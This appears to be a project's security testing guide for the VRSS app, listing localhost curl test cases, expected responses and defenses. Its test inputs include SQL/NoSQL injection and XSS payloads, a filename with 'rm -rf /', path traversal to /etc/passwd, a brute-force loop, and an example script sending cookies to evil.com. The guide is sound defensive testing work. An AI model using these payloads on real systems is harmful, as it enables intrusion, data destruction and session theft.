# VRSS Security Testing Guide

Comprehensive testing guide for security validation before launch.

---

## Table of Contents

1. [Authentication Testing](#authentication-testing)
2. [Authorization Testing](#authorization-testing)
3. [Input Validation Testing](#input-validation-testing)
4. [Session Management Testing](#session-management-testing)
5. [File Upload Security Testing](#file-upload-security-testing)
6. [API Security Testing](#api-security-testing)
7. [Common Attack Scenarios](#common-attack-scenarios)
8. [Automated Security Testing](#automated-security-testing)
9. [Manual Penetration Testing](#manual-penetration-testing)
10. [Security Monitoring](#security-monitoring)

---

## Authentication Testing

### Test Cases

#### 1. Registration

```bash
# Valid registration
curl -X POST http://localhost:3000/api/auth/sign-up \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "SecureP@ssw0rd123",
    "username": "testuser"
  }'
# Expected: 201 Created

# Weak password
curl -X POST http://localhost:3000/api/auth/sign-up \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "weak",
    "username": "testuser"
  }'
# Expected: 400 Bad Request

# Duplicate email
curl -X POST http://localhost:3000/api/auth/sign-up \
  -H "Content-Type: application/json" \
  -d '{
    "email": "existing@example.com",
    "password": "SecureP@ssw0rd123",
    "username": "testuser2"
  }'
# Expected: 400 Bad Request

# SQL injection attempt
curl -X POST http://localhost:3000/api/auth/sign-up \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "SecureP@ssw0rd123",
    "username": "admin'--"
  }'
# Expected: 400 Bad Request (invalid username format)

# XSS attempt in name
curl -X POST http://localhost:3000/api/auth/sign-up \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "SecureP@ssw0rd123",
    "username": "testuser",
    "name": "<script>alert(1)</script>"
  }'
# Expected: Accepted but sanitized (or rejected)
```

#### 2. Login

```bash
# Valid login
curl -X POST http://localhost:3000/api/auth/sign-in \
  -H "Content-Type: application/json" \
  -c cookies.txt \
  -d '{
    "email": "test@example.com",
    "password": "SecureP@ssw0rd123"
  }'
# Expected: 200 OK + Set-Cookie

# Invalid password
curl -X POST http://localhost:3000/api/auth/sign-in \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "wrong"
  }'
# Expected: 401 Unauthorized

# Non-existent user
curl -X POST http://localhost:3000/api/auth/sign-in \
  -H "Content-Type: application/json" \
  -d '{
    "email": "nonexistent@example.com",
    "password": "SecureP@ssw0rd123"
  }'
# Expected: 401 Unauthorized (same as invalid password)

# Unverified email
curl -X POST http://localhost:3000/api/auth/sign-in \
  -H "Content-Type: application/json" \
  -d '{
    "email": "unverified@example.com",
    "password": "SecureP@ssw0rd123"
  }'
# Expected: 403 Forbidden

# Rate limit test (run 15+ times rapidly)
for i in {1..15}; do
  curl -X POST http://localhost:3000/api/auth/sign-in \
    -H "Content-Type: application/json" \
    -d '{
      "email": "test@example.com",
      "password": "wrong"
    }'
done
# Expected: First 10 attempts get 401, remaining get 429
```

#### 3. Email Verification

```bash
# Valid token
curl -X GET "http://localhost:3000/api/auth/verify-email?token=VALID_TOKEN"
# Expected: Redirect to app + session created

# Invalid token
curl -X GET "http://localhost:3000/api/auth/verify-email?token=invalid"
# Expected: 400 Bad Request

# Expired token
curl -X GET "http://localhost:3000/api/auth/verify-email?token=EXPIRED_TOKEN"
# Expected: 400 Bad Request

# Reused token
curl -X GET "http://localhost:3000/api/auth/verify-email?token=USED_TOKEN"
# Expected: 400 Bad Request
```

#### 4. Password Reset

```bash
# Request reset
curl -X POST http://localhost:3000/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com"
  }'
# Expected: 200 OK (always, even if email doesn't exist)

# Email enumeration test
time curl -X POST http://localhost:3000/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email": "existing@example.com"}'

time curl -X POST http://localhost:3000/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email": "nonexistent@example.com"}'
# Expected: Same response time (prevent enumeration)

# Reset with valid token
curl -X POST http://localhost:3000/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "token": "VALID_RESET_TOKEN",
    "password": "NewSecureP@ssw0rd123"
  }'
# Expected: 200 OK + all sessions invalidated

# Reset with expired token
curl -X POST http://localhost:3000/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "token": "EXPIRED_TOKEN",
    "password": "NewSecureP@ssw0rd123"
  }'
# Expected: 400 Bad Request

# Weak password in reset
curl -X POST http://localhost:3000/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "token": "VALID_RESET_TOKEN",
    "password": "weak"
  }'
# Expected: 400 Bad Request
```

---

## Authorization Testing

### Test Cases

#### 1. Protected Endpoints

```bash
# Access without authentication
curl -X GET http://localhost:3000/api/posts
# Expected: 401 Unauthorized

# Access with authentication
curl -X GET http://localhost:3000/api/posts \
  -b cookies.txt
# Expected: 200 OK

# Access with invalid session
curl -X GET http://localhost:3000/api/posts \
  -H "Cookie: vrss.session_token=invalid"
# Expected: 401 Unauthorized

# Access with expired session
curl -X GET http://localhost:3000/api/posts \
  -H "Cookie: vrss.session_token=EXPIRED_TOKEN"
# Expected: 401 Unauthorized
```

#### 2. Resource Ownership

```bash
# Delete own post (should succeed)
curl -X DELETE http://localhost:3000/api/posts/POST_ID \
  -b user1_cookies.txt
# Expected: 200 OK

# Delete another user's post (should fail)
curl -X DELETE http://localhost:3000/api/posts/USER2_POST_ID \
  -b user1_cookies.txt
# Expected: 403 Forbidden

# Update another user's profile (should fail)
curl -X PATCH http://localhost:3000/api/users/user2 \
  -b user1_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"bio": "Hacked!"}'
# Expected: 403 Forbidden
```

#### 3. Profile Visibility

```bash
# View public profile (unauthenticated)
curl -X GET http://localhost:3000/api/users/publicuser
# Expected: 200 OK

# View private profile (unauthenticated)
curl -X GET http://localhost:3000/api/users/privateuser
# Expected: 403 Forbidden

# View private profile (authenticated, not follower)
curl -X GET http://localhost:3000/api/users/privateuser \
  -b user1_cookies.txt
# Expected: 403 Forbidden

# View private profile (authenticated, follower)
curl -X GET http://localhost:3000/api/users/privateuser \
  -b follower_cookies.txt
# Expected: 200 OK

# View unlisted profile (direct link)
curl -X GET http://localhost:3000/api/users/unlisteduser
# Expected: 200 OK
```

#### 4. IDOR (Insecure Direct Object Reference)

```bash
# Access another user's sessions
curl -X GET http://localhost:3000/api/auth/sessions \
  -b user1_cookies.txt
# Should ONLY return user1's sessions

# Attempt to access specific session by ID manipulation
curl -X DELETE http://localhost:3000/api/auth/sessions/USER2_SESSION_ID \
  -b user1_cookies.txt
# Expected: 404 Not Found or 403 Forbidden

# Access another user's uploads
curl -X GET http://localhost:3000/api/uploads \
  -b user1_cookies.txt
# Should ONLY return user1's uploads
```

---

## Input Validation Testing

### Test Cases

#### 1. XSS Prevention

```bash
# XSS in post content
curl -X POST http://localhost:3000/api/posts \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "content": "<script>alert(document.cookie)</script>"
  }'
# Expected: Sanitized or escaped on output

# XSS in profile bio
curl -X PATCH http://localhost:3000/api/profile \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "bio": "<img src=x onerror=alert(1)>"
  }'
# Expected: Sanitized

# XSS in username (registration)
curl -X POST http://localhost:3000/api/auth/sign-up \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "SecureP@ssw0rd123",
    "username": "<script>alert(1)</script>"
  }'
# Expected: 400 Bad Request (invalid format)
```

#### 2. SQL Injection Prevention

```bash
# SQL injection in search
curl -X GET "http://localhost:3000/api/search?q=test' OR '1'='1"
# Expected: Safe query (parameterized)

# SQL injection in username lookup
curl -X GET "http://localhost:3000/api/users/admin'--"
# Expected: 404 Not Found (treated as literal username)

# SQL injection in login
curl -X POST http://localhost:3000/api/auth/sign-in \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@example.com\" OR \"1\"=\"1",
    "password": "anything"
  }'
# Expected: 401 Unauthorized (parameterized query)
```

#### 3. NoSQL Injection (if using MongoDB)

```bash
# NoSQL injection in login
curl -X POST http://localhost:3000/api/auth/sign-in \
  -H "Content-Type: application/json" \
  -d '{
    "email": {"$ne": null},
    "password": {"$ne": null}
  }'
# Expected: 400 Bad Request (schema validation)
```

#### 4. Command Injection

```bash
# Command injection in filename
curl -X POST http://localhost:3000/api/upload/request-upload \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "test.jpg; rm -rf /",
    "contentType": "image/jpeg",
    "size": 1000
  }'
# Expected: Sanitized filename or rejected
```

#### 5. Path Traversal

```bash
# Path traversal in file access
curl -X GET "http://localhost:3000/api/files/../../etc/passwd"
# Expected: 400 Bad Request or 404 Not Found

# Path traversal in upload
curl -X POST http://localhost:3000/api/upload/request-upload \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "../../../etc/passwd",
    "contentType": "text/plain",
    "size": 1000
  }'
# Expected: Sanitized path
```

---

## Session Management Testing

### Test Cases

#### 1. Session Lifecycle

```bash
# Login and verify session
curl -X POST http://localhost:3000/api/auth/sign-in \
  -H "Content-Type: application/json" \
  -c cookies.txt \
  -d '{
    "email": "test@example.com",
    "password": "SecureP@ssw0rd123"
  }'

# Use session
curl -X GET http://localhost:3000/api/auth/session \
  -b cookies.txt
# Expected: User data

# Logout
curl -X POST http://localhost:3000/api/auth/sign-out \
  -b cookies.txt

# Try to use session after logout
curl -X GET http://localhost:3000/api/auth/session \
  -b cookies.txt
# Expected: 401 Unauthorized
```

#### 2. Session Fixation

```bash
# Get session ID before login
BEFORE_LOGIN=$(curl -c - http://localhost:3000/ | grep session_token | awk '{print $7}')

# Login
curl -X POST http://localhost:3000/api/auth/sign-in \
  -H "Content-Type: application/json" \
  -c cookies.txt \
  -d '{
    "email": "test@example.com",
    "password": "SecureP@ssw0rd123"
  }'

# Get session ID after login
AFTER_LOGIN=$(cat cookies.txt | grep session_token | awk '{print $7}')

# Session IDs should be different
if [ "$BEFORE_LOGIN" != "$AFTER_LOGIN" ]; then
  echo "✓ Session regenerated on login"
else
  echo "✗ Session fixation vulnerability!"
fi
```

#### 3. Concurrent Sessions

```bash
# Login on device 1
curl -X POST http://localhost:3000/api/auth/sign-in \
  -H "Content-Type: application/json" \
  -c device1.txt \
  -d '{
    "email": "test@example.com",
    "password": "SecureP@ssw0rd123"
  }'

# Login on device 2
curl -X POST http://localhost:3000/api/auth/sign-in \
  -H "Content-Type: application/json" \
  -c device2.txt \
  -d '{
    "email": "test@example.com",
    "password": "SecureP@ssw0rd123"
  }'

# Both sessions should work
curl -X GET http://localhost:3000/api/auth/session -b device1.txt
curl -X GET http://localhost:3000/api/auth/session -b device2.txt
# Expected: Both return 200 OK

# List active sessions
curl -X GET http://localhost:3000/api/auth/sessions -b device1.txt
# Expected: Shows both sessions
```

#### 4. Session Expiration

```bash
# Create session
curl -X POST http://localhost:3000/api/auth/sign-in \
  -H "Content-Type: application/json" \
  -c cookies.txt \
  -d '{
    "email": "test@example.com",
    "password": "SecureP@ssw0rd123"
  }'

# Manually expire session in database
# UPDATE "Session" SET "expiresAt" = NOW() WHERE token = 'xxx';

# Try to use expired session
curl -X GET http://localhost:3000/api/auth/session \
  -b cookies.txt
# Expected: 401 Unauthorized
```

---

## File Upload Security Testing

### Test Cases

#### 1. File Type Validation

```bash
# Valid image upload
curl -X POST http://localhost:3000/api/upload/request-upload \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "image.jpg",
    "contentType": "image/jpeg",
    "size": 100000
  }'
# Expected: 200 OK + presigned URL

# Executable file (blocked)
curl -X POST http://localhost:3000/api/upload/request-upload \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "malware.exe",
    "contentType": "application/x-msdownload",
    "size": 100000
  }'
# Expected: 400 Bad Request

# PHP file disguised as image (content type mismatch)
curl -X POST http://localhost:3000/api/upload/request-upload \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "shell.php",
    "contentType": "image/jpeg",
    "size": 100000
  }'
# Expected: Backend should verify actual file type after upload
```

#### 2. File Size Validation

```bash
# Within limit
curl -X POST http://localhost:3000/api/upload/request-upload \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "image.jpg",
    "contentType": "image/jpeg",
    "size": 1000000
  }'
# Expected: 200 OK

# Exceeds single file limit (50MB)
curl -X POST http://localhost:3000/api/upload/request-upload \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "large.jpg",
    "contentType": "image/jpeg",
    "size": 52428801
  }'
# Expected: 400 Bad Request

# Exceeds user storage quota
curl -X POST http://localhost:3000/api/upload/request-upload \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "image.jpg",
    "contentType": "image/jpeg",
    "size": 52428800
  }'
# Expected: 413 Storage Quota Exceeded (if user already has files)
```

#### 3. Upload Ownership

```bash
# Request upload as user1
RESPONSE=$(curl -X POST http://localhost:3000/api/upload/request-upload \
  -b user1_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "image.jpg",
    "contentType": "image/jpeg",
    "size": 100000
  }')

UPLOAD_ID=$(echo $RESPONSE | jq -r '.uploadId')

# Try to confirm as user2
curl -X POST "http://localhost:3000/api/upload/confirm-upload/$UPLOAD_ID" \
  -b user2_cookies.txt
# Expected: 404 Not Found or 403 Forbidden
```

#### 4. Malicious File Upload

```bash
# SVG with embedded JavaScript
curl -X POST http://localhost:3000/api/upload/request-upload \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "image.svg",
    "contentType": "image/svg+xml",
    "size": 1000
  }'
# SVG should be rejected OR Content-Type forced to prevent execution

# Zip bomb (highly compressed file)
# Should be rejected by size validation or virus scanner

# Polyglot file (valid image + valid script)
# Should be caught by content-type verification
```

---

## API Security Testing

### Test Cases

#### 1. CORS

```bash
# Cross-origin request from allowed origin
curl -X POST http://localhost:3000/api/auth/sign-in \
  -H "Origin: http://localhost:5173" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "SecureP@ssw0rd123"
  }'
# Expected: Access-Control-Allow-Origin: http://localhost:5173

# Cross-origin request from disallowed origin
curl -X POST http://localhost:3000/api/auth/sign-in \
  -H "Origin: http://evil.com" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "SecureP@ssw0rd123"
  }'
# Expected: No CORS headers (browser would block)

# Preflight request
curl -X OPTIONS http://localhost:3000/api/posts \
  -H "Origin: http://localhost:5173" \
  -H "Access-Control-Request-Method: POST"
# Expected: Access-Control-Allow-Methods: POST
```

#### 2. CSRF

```bash
# CSRF attempt (request from different origin without proper headers)
curl -X POST http://localhost:3000/api/posts \
  -b cookies.txt \
  -H "Origin: http://evil.com" \
  -H "Content-Type: application/json" \
  -d '{
    "content": "CSRF test"
  }'
# Expected: Blocked by CORS or CSRF protection

# Valid request (same origin)
curl -X POST http://localhost:3000/api/posts \
  -b cookies.txt \
  -H "Origin: http://localhost:5173" \
  -H "Content-Type: application/json" \
  -d '{
    "content": "Valid post"
  }'
# Expected: 201 Created
```

#### 3. Security Headers

```bash
# Check security headers
curl -I http://localhost:3000/
# Expected headers:
# - Strict-Transport-Security
# - X-Content-Type-Options: nosniff
# - X-Frame-Options: DENY
# - Content-Security-Policy
# - X-XSS-Protection
# - Referrer-Policy

# Verify CSP blocks inline scripts
# (Manual test in browser)
```

#### 4. Rate Limiting

```bash
# Test rate limit on login endpoint
for i in {1..15}; do
  curl -w "\nStatus: %{http_code}\n" \
    -X POST http://localhost:3000/api/auth/sign-in \
    -H "Content-Type: application/json" \
    -d '{
      "email": "test@example.com",
      "password": "wrong"
    }'
done
# Expected: First 10 return 401, remaining return 429

# Verify rate limit headers
curl -I -X POST http://localhost:3000/api/auth/sign-in \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "wrong"
  }'
# Expected headers:
# - X-RateLimit-Limit
# - X-RateLimit-Remaining
# - X-RateLimit-Reset
```

---

## Common Attack Scenarios

### 1. Account Takeover

**Attack**: Brute force login

```bash
# Automated brute force (should be blocked by rate limiting)
while read password; do
  curl -X POST http://localhost:3000/api/auth/sign-in \
    -H "Content-Type: application/json" \
    -d "{
      \"email\": \"victim@example.com\",
      \"password\": \"$password\"
    }"
done < passwords.txt
```

**Defense**:
- Rate limiting (10 attempts / 15 min)
- CAPTCHA after N failed attempts (future)
- Account lockout (future)
- Email notification on suspicious activity

### 2. Session Hijacking

**Attack**: Steal session cookie via XSS

```javascript
// Injected script (should be prevented)
<script>
  fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>
```

**Defense**:
- HttpOnly cookies (JavaScript can't access)
- Content Security Policy (blocks inline scripts)
- XSS prevention (input sanitization)

### 3. CSRF Attack

**Attack**: Malicious site tricks user into making request

```html
<!-- evil.com page -->
<form action="https://vrss.app/api/posts" method="POST">
  <input type="hidden" name="content" value="Spam post" />
</form>
<script>document.forms[0].submit();</script>
```

**Defense**:
- SameSite cookies (lax/strict)
- CORS policy
- Origin header validation
- CSRF tokens (additional layer)

### 4. Privilege Escalation

**Attack**: Regular user tries to access admin functions

```bash
# Attempt to access admin endpoint
curl -X GET http://localhost:3000/api/admin/users \
  -b user_cookies.txt
# Expected: 403 Forbidden

# Attempt to modify another user's data
curl -X PATCH http://localhost:3000/api/users/admin \
  -b user_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"role": "ADMIN"}'
# Expected: 403 Forbidden
```

**Defense**:
- Role-based access control (RBAC)
- Resource ownership checks
- Server-side authorization (never trust client)

### 5. Data Leakage

**Attack**: Access data that should be private

```bash
# Attempt to enumerate users
for id in {1..1000}; do
  curl -X GET "http://localhost:3000/api/users/$id"
done

# Attempt to access private profiles
curl -X GET http://localhost:3000/api/users/private-user
# Expected: 403 Forbidden (if not follower)
```

**Defense**:
- Profile visibility settings
- Authorization checks
- Rate limiting (prevent enumeration)
- UUID instead of sequential IDs

### 6. Storage Quota Bypass

**Attack**: Upload more than allowed

```bash
# Falsify file size
curl -X POST http://localhost:3000/api/upload/request-upload \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "small.jpg",
    "contentType": "image/jpeg",
    "size": 1000
  }'

# Upload actual large file to presigned URL
curl -X PUT "$PRESIGNED_URL" \
  --data-binary @large_file.jpg
```

**Defense**:
- Verify actual file size after upload
- S3 bucket policies (max object size)
- Re-check quota on confirmation

---

## Automated Security Testing

### 1. Dependency Scanning

```bash
# Check for vulnerable dependencies
bun audit

# Alternative: Snyk
npx snyk test

# Alternative: npm audit
npm audit
```

### 2. Static Analysis

```bash
# ESLint security plugin
npm install -D eslint-plugin-security

# SonarQube (requires setup)
sonar-scanner

# Semgrep (SAST)
semgrep --config=auto .
```

### 3. OWASP ZAP

```bash
# Docker: Run OWASP ZAP baseline scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t http://localhost:3000 \
  -r zap-report.html

# Full scan
docker run -t owasp/zap2docker-stable zap-full-scan.py \
  -t http://localhost:3000 \
  -r zap-full-report.html
```

### 4. Security Headers

```bash
# Check security headers
curl -I https://vrss.app | grep -E "(Strict-Transport-Security|Content-Security-Policy|X-Frame-Options|X-Content-Type-Options)"

# Online tool
# https://securityheaders.com/?q=vrss.app
```

---

## Manual Penetration Testing

### Pre-Test Checklist

- [ ] Obtain written authorization
- [ ] Define scope (what's allowed)
- [ ] Set up isolated test environment
- [ ] Document all findings
- [ ] Report responsibly

### Testing Methodology (OWASP)

1. **Information Gathering**
   - [ ] Identify technologies (Wappalyzer)
   - [ ] Find exposed endpoints
   - [ ] Check for version disclosure

2. **Configuration Management**
   - [ ] Test for default credentials
   - [ ] Check for exposed config files
   - [ ] Test SSL/TLS configuration

3. **Authentication**
   - [ ] Test password policy
   - [ ] Test account lockout
   - [ ] Test password reset flow
   - [ ] Test remember me functionality

4. **Session Management**
   - [ ] Test session fixation
   - [ ] Test session timeout
   - [ ] Test logout functionality
   - [ ] Test concurrent sessions

5. **Authorization**
   - [ ] Test vertical privilege escalation
   - [ ] Test horizontal privilege escalation
   - [ ] Test IDOR vulnerabilities
   - [ ] Test forced browsing

6. **Input Validation**
   - [ ] Test for XSS
   - [ ] Test for SQL injection
   - [ ] Test for command injection
   - [ ] Test for path traversal
   - [ ] Test for file inclusion

7. **Error Handling**
   - [ ] Test for stack traces
   - [ ] Test for sensitive info in errors
   - [ ] Test for verbose errors

8. **Cryptography**
   - [ ] Test password storage
   - [ ] Test sensitive data encryption
   - [ ] Test SSL/TLS implementation

9. **Business Logic**
   - [ ] Test workflow bypass
   - [ ] Test race conditions
   - [ ] Test payment logic (if applicable)

10. **Client-Side**
    - [ ] Test for sensitive data in client
    - [ ] Test JavaScript security
    - [ ] Test for DOM-based XSS

---

## Security Monitoring

### 1. Failed Login Attempts

```sql
-- Monitor failed logins (via audit logs)
SELECT
  ip_address,
  COUNT(*) as attempts,
  MAX(timestamp) as last_attempt
FROM audit_logs
WHERE action = 'FAILED_LOGIN'
  AND timestamp > NOW() - INTERVAL '1 hour'
GROUP BY ip_address
HAVING COUNT(*) > 5
ORDER BY attempts DESC;
```

### 2. Suspicious Activity

```sql
-- Multiple account creation from same IP
SELECT
  ip_address,
  COUNT(*) as accounts_created
FROM audit_logs
WHERE action = 'ACCOUNT_CREATED'
  AND timestamp > NOW() - INTERVAL '1 day'
GROUP BY ip_address
HAVING COUNT(*) > 3;

-- Unusual file upload activity
SELECT
  user_id,
  COUNT(*) as uploads,
  SUM(size) as total_bytes
FROM uploads
WHERE created_at > NOW() - INTERVAL '1 hour'
GROUP BY user_id
HAVING COUNT(*) > 20 OR SUM(size) > 100000000;
```

### 3. Error Rate Monitoring

```javascript
// Track error rates
const errorRate = {
  total: 0,
  errors: 0,
  rate: function() {
    return this.errors / this.total;
  }
};

app.use(async (c, next) => {
  errorRate.total++;
  try {
    await next();
  } catch (error) {
    errorRate.errors++;
    throw error;
  }
});

// Alert if error rate > 5%
setInterval(() => {
  if (errorRate.rate() > 0.05) {
    console.error('High error rate detected:', errorRate.rate());
    // Send alert
  }
}, 60000); // Every minute
```

---

## Pre-Launch Security Checklist

### Critical

- [ ] All endpoints require authentication where appropriate
- [ ] Input validation on all user inputs
- [ ] XSS prevention (output encoding/sanitization)
- [ ] SQL injection prevention (parameterized queries)
- [ ] CSRF protection enabled
- [ ] Rate limiting on authentication endpoints
- [ ] HTTPS enforced (production)
- [ ] Security headers configured
- [ ] Secrets in environment variables (not code)
- [ ] Password hashing (bcrypt)
- [ ] Session management secure (HttpOnly, Secure cookies)

### Important

- [ ] File upload validation (type, size)
- [ ] Storage quota enforced
- [ ] Profile visibility controls working
- [ ] Resource ownership checks
- [ ] Error messages don't leak info
- [ ] Audit logging for sensitive actions
- [ ] Database backups configured
- [ ] Monitoring and alerting set up

### Nice to Have

- [ ] Penetration testing completed
- [ ] Security headers rated A+ (securityheaders.com)
- [ ] Dependency scanning automated
- [ ] Incident response plan documented
- [ ] Security training for team

---

## Tools & Resources

### Testing Tools

- **OWASP ZAP**: Web application security scanner
- **Burp Suite**: Web vulnerability scanner
- **Postman**: API testing
- **curl**: Command-line HTTP client
- **sqlmap**: SQL injection testing
- **Nikto**: Web server scanner

### Security Scanners

- **Snyk**: Dependency vulnerability scanning
- **npm audit**: Node.js dependency check
- **Semgrep**: Static analysis
- **SonarQube**: Code quality & security

### Online Tools

- **securityheaders.com**: Check security headers
- **ssllabs.com**: SSL/TLS configuration test
- **hardenize.com**: Security configuration check
- **webhook.site**: Test webhooks/callbacks

### Learning Resources

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **OWASP ASVS**: Application Security Verification Standard
- **PortSwigger Web Security Academy**: Free training
- **HackTheBox**: Hands-on security challenges

---

## Conclusion

Security testing is an ongoing process, not a one-time event. Regularly:

1. **Test** authentication and authorization flows
2. **Scan** for vulnerabilities in dependencies
3. **Monitor** for suspicious activity
4. **Update** dependencies and security patches
5. **Review** access logs and audit trails
6. **Practice** incident response procedures

**Remember**: Security is everyone's responsibility. Stay vigilant!
